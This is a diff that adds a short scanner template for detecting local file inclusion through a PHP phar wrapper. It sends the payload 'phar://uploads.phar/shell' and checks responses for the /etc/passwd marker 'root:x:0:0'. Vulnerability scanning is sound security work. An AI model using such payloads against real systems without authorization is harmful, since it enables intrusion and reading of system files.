@@ -1,0 +1,20 @@
+id: lfi5-092
+name: 'Wrapper phar via path'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - wrapper
+description: 'Reads file via phar wrapper'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      path:
+        - 'phar://uploads.phar/shell'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
